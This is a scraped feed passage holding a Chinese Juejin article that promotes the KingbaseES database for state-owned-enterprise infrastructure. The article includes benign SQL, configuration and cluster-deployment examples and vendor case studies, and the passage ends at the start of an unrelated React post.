<p>也欢迎大家关注后续分享。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[关键信息基础设施的数据库选型：高可用、全链路安全与平滑替代的技术实践]]></title>    <link>https://juejin.cn/post/7576223441683890239</link>    <guid>https://juejin.cn/post/7576223441683890239</guid>    <pubDate>2025-11-24T12:24:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576223441683890239" data-draft-id="7576223441683857471" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="关键信息基础设施的数据库选型：高可用、全链路安全与平滑替代的技术实践"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2025-11-24T12:24:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="倔强的石头_"/> <meta itemprop="url" content="https://juejin.cn/user/3168119757484368"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            关键信息基础设施的数据库选型：高可用、全链路安全与平滑替代的技术实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3168119757484368/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    倔强的石头_
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:24:59.000Z" title="Mon Nov 24 2025 12:24:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>论及央企国企的数字化转型时，数据库便是那块犹如定海神针一般的“压舱石”，其要求十分简单，即稳固，安全且可被控制，绝不能出现半点差错。金仓数据库（KingbaseES，又称KES）属于数据库领域的“国家队”，其早已非新手，已在能源，电力，金融，交通等关键行业扎根，始终支撑着核心业务的稳定运行，助力国产化进程稳步前行，此篇文章不过分虚夸，仅凭官方资料与公开案例阐述，把KES的技术优势所在，及其在央国企如何落实开来清楚道破，而且还会附上可以直接执行的代码，让你既能看懂，又能动手尝试。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9b837c819f9f4d348473c1f68d011908~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=xKwZ29jGvsAGf57Sf2Lwt15FqAU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-1">金仓数据库的介绍</h2>
<ul>
<li>
<p>产品定位与架构特征</p>
<ul>
<li>
<p>KES 的定位很清楚，就是冲着各行各业的要害应用去的。它是个企业级的大型通用融合数据库，说白了就是个“多面手”：既能处理日常交易（OLTP），也能搞定数据分析（OLAP），还能轻松拿捏海量的时序数据、全文搜索、地理信息（GIS）这些复杂活儿。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1002b4da74f9474fb56460b7f4bd3c3f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=6zrCx1oFKSA1DriSqJVFUEvtTOY%3D" alt="image.png" loading="lazy"/></p>
</li>
<li>
<p>融合数据库架构：最厉害的是它的“融合”架构：一套软件，就能同时兼容 Oracle、MySQL、SQL Server、PostgreSQL 好几种主流语法，开发迁移都省心。数据模型上，不管是传统的关系型数据，还是时髦的文档/JSON、全文、GIS、时序数据，它都能装得下。部署的时候，你可以根据业务对可用性和成本的要求，自由选择集中式或者分布式，非常灵活。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c9474d6ed7b747cdae4d046d5eec77c1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=ObdpJzNjBHAOj37DVUU9hoIg%2BHo%3D" alt="image.png" loading="lazy"/></p>
</li>
</ul>
</li>
<li>
<p>生态与工具链</p>
<ul>
<li>工具链覆盖评估、迁移、开发、运维全流程：金仓提供了一整套工具，把评估、迁移、开发、运维这些活儿全包了。用 KDMS/KDTS 搞定评估和迁移，用 KStudio 管理开发和数据库对象，再用 KOPS/KEMCC 做集中的监控和运维。可以说，从“能不能迁过来”到“用得爽不爽”，整个生命周期它都帮你安排得明明白白。
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/45898bdf8c9946d1a08081b36302aa78~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=Gbk2sTcXyqYH4UWd%2B22owYASj7E%3D" alt="image.png" loading="lazy"/></li>
</ul>
</li>
<li>
<p>安全与合规能力</p>
<ul>
<li>三权分立：这个机制很关键，它把数据库管理员、安全管理员（sso）、审计管理员（sao）的权限彻底分开，谁也管不了谁，这样就避免了“超级管理员”一个人说了算的情况，安全性大大提高。而且，它还支持受限的 DBA 插件式管理，权限控制得更细。</li>
<li>传输加密：数据在网络上传输的时候，KES 原生就支持 SSL/TLS 加密。你只要配好证书和加密算法，就能保证数据在路上不被偷看或篡改，链路安全得很。</li>
<li>审计能力：谁动了我的数据？KES 的 sysaudit 插件能把服务器上发生的各种事件、执行的 SQL 语句、操作的对象都记下来。审计的开关和策略完全由你控制，想查什么就查什么。</li>
<li>强制访问控制（MAC）：对于保密要求极高的场景，KES 还有大招——强制访问控制。通过给数据打上不同的安全标签，可以实现对象级、列级甚至行级的访问控制。这得加载 sysmac 插件才能用，但效果绝对硬核。</li>
</ul>
</li>
<li>
<p>可用性与集群</p>
<ul>
<li>高可用这块，金仓的方案很全。从基本的主备、读写分离，到要求更高的同城双活、两地三中心，再到能跨节点读写和扩展的 RAC 共享存储集群，各种架构都能搭。总之一句话，既保证了业务连续性，又能按需扩展。</li>
</ul>
</li>
<li>
<p>市场应用与装机规模</p>
<ul>
<li>官方自己公布的数据是：KES 已经给能源、金融、电信、交通、医疗、政务等 30 多个行业提供了服务，装机量累计超过了 100 万套。而且，在国产数据库的关键应用领域，它的销售套数已经连续四年排第一了。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">金仓数据库在央企国企应用的技术解读</h2>
<p>对于央企和国企来说，选数据库，光“能用”是远远不够的，关键得“用得好”。什么叫用得好？平滑替换得省心，系统架构得能扛事儿，安全防护得没漏洞，数据用起来得顺手，迁移和运维还得省力气。下面，咱们就结合金仓官方给出的能力和一些典型场景，把这些关键点掰开揉碎了讲，并且配上代码例子，方便你实际操作。</p>
<h3 data-id="heading-3">1. 平滑替代与生态兼容</h3>
<p>-KES 兼容 Oracle，MySQL，SQL Server，PostgreSQL 的语法与接口，这在国产化替代进程中堪称福音，其优势十分明显，即业务代码无需大幅改动或者无需改动，如此一来，既能极大压缩项目历时，又能把迁移风险降至较低水平。</p>
<p>典型的兼容例子就是Oracle中常被用到的同义词（Synonym），KES也是支持它的，迁移过来以后，可以利用它给表起别名，这样之前的程序代码就无需做修改，可以直接被访问，十分便捷。</p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 在当前模式创建同义词，指向目标对象</span>
<span class="hljs-keyword">CREATE</span> SYNONYM emp <span class="hljs-keyword">FOR</span> hr.employees;

<span class="hljs-comment">-- 也支持指定用户模式创建</span>
<span class="hljs-keyword">CREATE</span> SYNONYM hr_emp <span class="hljs-keyword">FOR</span> hr.employees;
</code></pre>
<ul>
<li>外部服务与 FDW（示例）：有时候需要访问其他数据库的数据，KES 的外部数据包装器（FDW）就能派上用场。通过它，你可以直接在 KES 里查询另一个数据库的表，就像操作本地表一样。（下面的语法只是个例子，具体用的时候得根据你的数据库版本和驱动来调整）。</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> SERVER myserver <span class="hljs-keyword">FOREIGN</span> DATA WRAPPER kingbase_fdw
  OPTIONS (host <span class="hljs-string">'db.internal'</span>, dbname <span class="hljs-string">'legacydb'</span>, port <span class="hljs-string">'54321'</span>);
</code></pre>
<h3 data-id="heading-4">2. 高可用架构与故障应对</h3>
<p>KES 所支持的架构十分全面，读写分离，同城双活，两地三中心，RAC 共享存储等方案，都可以帮助达成不同的恢复点目标（RPO）与恢复时间目标（RTO），从而保证业务做到一天 24 小时，一周 7 天不停歇运行。</p>
<p>在集群环境下，网络波动时，各节点均会自认为主节点，此现象被称为“脑裂”，KES经由守护进程（repmgrd/kbha）及信任网关设置，可规避此类情形，保障集群稳定。</p>
<p>部署脚本示例（命令行部署，遵照现场路径与版本适配），下面给出在命令行当中部署集群的简单示例，实际执行的时候，要按照服务器上的具体路径以及 KES 的版本做相应的调整。</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 编辑安装配置</span>
vi /opt/Kingbase/ES/V9/Server/bin/install.conf

<span class="hljs-comment"># 初始化并启动安全组件（示例路径因版本而异）</span>
/opt/Kingbase/ES/V9/Server/bin/sys_HAscmdd.sh init
/opt/Kingbase/ES/V9/Server/bin/sys_HAscmdd.sh start

<span class="hljs-comment"># 执行集群部署（同目录下 cluster_install.sh、trust_cluster.sh 等文件准备齐全）</span>
sh /opt/Kingbase/ES/V9/Server/bin/cluster_install.sh
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be214edb9b624d0e89b801d4f151ee68~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=0EfFbCiyNOgqCMG3zSMxgisHws0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-5">3. 全链路安全：三权分立、SSL、审计、MAC</h3>
<ul>
<li>
<p>管理分权（三权分立）：数据库一初始化，就会自动创建<code>管理员（system）</code>、<code>安全管理员（sso）</code>和<code>审计管理员（sao）</code>这三个角色。他们仨各管一摊，权限边界清清楚楚，谁也越不了界。</p>
</li>
<li>
<p>传输加密（SSL）配置示例：</p>
</li>
</ul>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># kingbase.conf</span>
<span class="hljs-attr">ssl</span> = <span class="hljs-literal">on</span>
<span class="hljs-attr">ssl_cert_file</span> = <span class="hljs-string">'server.crt'</span>
<span class="hljs-attr">ssl_key_file</span>  = <span class="hljs-string">'server.key'</span>
<span class="hljs-attr">ssl_ca_file</span>   = <span class="hljs-string">'rootCA.crt'</span>
<span class="hljs-attr">ssl_ciphers</span>   = <span class="hljs-string">'HIGH:!aNULL:!MD5'</span>  <span class="hljs-comment"># 示例密码套件，按安全策略收敛</span>

<span class="hljs-comment"># sys_hba.conf（强制证书认证）</span>
<span class="hljs-comment"># 仅示例：根据实际网段与角色收敛</span>
hostssl all all 10.0.0.0/16 cert <span class="hljs-attr">clientcert</span>=<span class="hljs-number">1</span>
</code></pre>
<ul>
<li>审计开关与重载（sysaudit 插件）：想用审计功能，得先在配置文件里把 <code>sysaudit</code> 这个插件加载上。等数据库启动后，你就可以随时通过命令打开审计功能，然后重新加载一下配置，它就立马生效了。</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 加载审计插件（启动前配置）</span>
<span class="hljs-comment">-- kingbase.conf: shared_preload_libraries = 'sysaudit'</span>

<span class="hljs-comment">-- 启动后打开审计并重载配置</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> sysaudit.enable <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;
<span class="hljs-keyword">CALL</span> sys_reload_conf();
</code></pre>
<ul>
<li>强制访问控制（MAC）：这是一种更高级的安全玩法，能给对象、列、甚至是行都打上安全标签，严格遵循“向下读、区间写”的保密模型。不过，这需要加载 <code>sysmac</code> 插件，并且具体的策略和语法得查阅对应版本的官方文档来配置。<a href="https://link.juejin.cn?target=https%3A%2F%2Fbbs.kingbase.com.cn%2Fkingbase-doc%2Fv8.6.8.14%2Fsafety%2Fsafety-guide%2Flabel-and-mac.html" target="_blank" title="https://bbs.kingbase.com.cn/kingbase-doc/v8.6.8.14/safety/safety-guide/label-and-mac.html" ref="nofollow noopener noreferrer">参考</a></li>
</ul>
<h3 data-id="heading-6">4. 多模与性能：分区、JSON、执行计划优化</h3>
<ul>
<li>分区表（时间分区示例）：当一张表的数据量变得特别大时，可以按时间范围把表“切”成一小块一小块的，这就是分区。这样做的好处是，既能减轻单个表的访问压力，也方便以后按月或按年对老数据进行清理或归档。</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings (
  reading_id   BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  device_id    <span class="hljs-type">BIGINT</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  reading_ts   <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">value</span>        <span class="hljs-type">NUMERIC</span>(<span class="hljs-number">18</span>,<span class="hljs-number">6</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
)
<span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">BY</span> <span class="hljs-keyword">RANGE</span> (reading_ts);

<span class="hljs-comment">-- 按月创建分区（示例）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings_2025_11
  <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> meter_readings <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-11-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2025-12-01'</span>);

<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> meter_readings_2025_12
  <span class="hljs-keyword">PARTITION</span> <span class="hljs-keyword">OF</span> meter_readings <span class="hljs-keyword">FOR</span> <span class="hljs-keyword">VALUES</span> <span class="hljs-keyword">FROM</span> (<span class="hljs-string">'2025-12-01'</span>) <span class="hljs-keyword">TO</span> (<span class="hljs-string">'2026-01-01'</span>);
</code></pre>
<ul>
<li>分区执行计划优化：如果你的分区表有成百上千个子分区，查询的时候数据库光生成执行计划就得花不少时间。通过设置 <code>partition_table_limit</code> 这个参数，你可以告诉数据库：当经过筛选后的子分区数量超过这个值时，就别再一个个精打细算了，直接用一种快速模式来生成计划，这样能大大提高高并发下的查询性能。</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 当剪枝后的子分区数超过该阈值，启用快速计划生成</span>
<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-keyword">SET</span> partition_table_limit <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
<span class="hljs-keyword">CALL</span> sys_reload_conf();
</code></pre>
<ul>
<li>JSON 数据类型（日志/消息示例）：现在很多业务日志和消息都喜欢用 JSON 格式。KES 原生就支持 JSON 数据类型，你可以直接把 JSON 存到数据库里，并且用它提供的函数方便地提取里面的字段，进行查询和分析。</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> event_logs (
  id       BIGSERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
  occurred <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> now(),
  payload  JSON <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
);

<span class="hljs-comment">-- 提取 JSON 字段（示例函数按版本提供）</span>
<span class="hljs-keyword">SELECT</span> payload<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span><span class="hljs-string">'eventType'</span> <span class="hljs-keyword">AS</span> event_type,
       (payload<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span><span class="hljs-string">'severity'</span>)::<span class="hljs-type">int</span> <span class="hljs-keyword">AS</span> severity
<span class="hljs-keyword">FROM</span> event_logs
<span class="hljs-keyword">WHERE</span> occurred <span class="hljs-operator">&gt;=</span> now() <span class="hljs-operator">-</span> <span class="hljs-type">interval</span> <span class="hljs-string">'1 day'</span>;
</code></pre>
<h2 data-id="heading-7">案例分析</h2>
<p>到了真金白银采购和选型的时候，说一千道一万，不如看看别人家是怎么用的。下面我们就扒一扒官方公开的几个案例，用事实说话。</p>
<ul>
<li>
<p>中国海洋石油集团（中国海油）</p>
<ul>
<li>规模有多大呢？超过 300 个业务系统，其中还包括 100 多个核心系统，全都从原来的数据库迁移到了金仓 KES。这些系统覆盖了从上游的勘探开发，到中游的生产运营，再到后台的经营管理和安全监控，可以说是把整个家底都搬上来了。</li>
<li>可用性怎么样？容灾能力做到了 RPO 接近 0，RTO 小于 30 秒。这意味着就算出了问题，数据基本不丢，半分钟内就能恢复。像应急指挥、工业互联网安全监控、钻井作业这些一秒都不能停的关键业务，全靠这套架构撑着。</li>
<li>安全这块也毫不含糊。KES 内置了好多层安全防护，还拿到了国家权威机构最高等级的安全认证 EAL4+。不管是等级保护还是国密算法的要求，都能满足。而且它跟各种国产的硬件、软件、云平台都能很好地配合。</li>
<li>迁移和运维顺不顺？中海油用了金仓全家桶工具（KDTS/KFS/KEMCC），实现了平滑迁移和实时的数据同步，最后还能把所有数据库都统一管起来。整个过程对业务基本没影响，做到了“无感切换”。</li>
</ul>
</li>
<li>
<p>国家电网（智能电网调度与新一代集控系统）</p>
<ul>
<li>国家电网的核心业务——智能电网调度系统（D5000）和新一代的集控系统，跑在金仓数据库上已经很多年了，一直非常稳定。这套系统在全国很多省市都上了线，实现了“无人值守、集中监控”的智能运维，效率大大提升。</li>
<li>电网这个行业，特点非常鲜明：数据采集和监控是一体的，有海量的数据需要高频率地写入，还得保证跨区域数据同步的准确和安全。这对数据库的要求极高，必须要有超强的吞吐能力和广域网下数据一致性的处理能力。</li>
</ul>
</li>
<li>
<p>央企整体与行业覆盖</p>
<ul>
<li>从整个央企市场来看，金仓官方的数据显示，KES 的总装机量已经超过了 100 万套，覆盖了能源、金融、交通、医疗、政务等 30 多个行业。在最关键的应用领域，它的销量已经连续四年都是国产数据库里的第一名。</li>
</ul>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b67ba1361804cdab213cafa30662575~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5YCU5by655qE55-z5aS0Xw==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764591898&amp;x-signature=mwQXMVlPOWC3M1S5zMJHGjkEAmU%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-8">结语</h2>
<p>总的来说，对于央企和国企，数据库这东西，不是说“能跑起来”就万事大吉了，而是要追求“稳、准、快、可控”。从咱们前面的分析能看出来，金仓数据库在兼容性、平滑迁移、高可用和安全合规这些方面，不仅有完整的技术方案，还有一整套的工具来保驾护航，并且已经在能源、电力这些核心行业里实打实地干了好多年，经受住了考验。如果你也打算用，这里有几条实在的建议：</p>
<ul>
<li>先把你的核心指标搞清楚，比如对数据丢失和业务中断的容忍度（RPO/RTO）、系统吞吐量要求（TPS/QPS）、数据模型的复杂度等等，然后根据这些来选择最合适的高可用架构和分区策略；</li>
<li>安全体系不能一蹴而就，但可以先把“三权分立 + SSL + 审计 + MAC”这一套组合拳作为安全基线，然后一步步地落地；</li>
<li>迁移的时候，别忘了金仓提供的那一套宝贝工具（KDMS/KDTS/KFS/KEMCC），一定要用足用好。最好采用新旧系统并行跑一段时间（双轨并行），再把真实业务的访问压力在新系统上模拟一遍（负载回放），确保万无一失；</li>
<li>如果你的业务并发量很大，或者分区表特别多，记得把执行计划优化的相关参数打开，并且要建立一套持续的监控机制，随时观察数据库的性能表现。</li>
</ul>
<p>记住，只要“架构选得准、工具用到位、策略拿得稳、验证做到足”，就一定能把国产数据库用好，让它成为咱们业务长期、稳定、可靠的数字底座。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React - 【useEffect 与 useLayoutEffect】 区别 及 使用场景]]></title>    <link>https://juejin.cn/post/7576105442213609522</link>    <guid>https://juejin.cn/post/7576105442213609522</guid>    <pubDate>2025-11-24T12:27:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576105442213609522" data-draft-id="7576086557716512819" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React - 【useEffect 与 useLayoutEffect】 区别 及 使用场景"/> <meta itemprop="keywords" content="React.js,前端"/> <meta itemprop="datePublished" content="2025-11-24T12:27:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="禁止摆烂_才浅"/> <meta itemprop="url" content="https://juejin.cn/user/92819673587448"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React - 【useEffect 与 useLayoutEffect】 区别 及 使用场景
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/92819673587448/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    禁止摆烂_才浅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T12:27:37.000Z" title="Mon Nov 24 2025 12:27:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
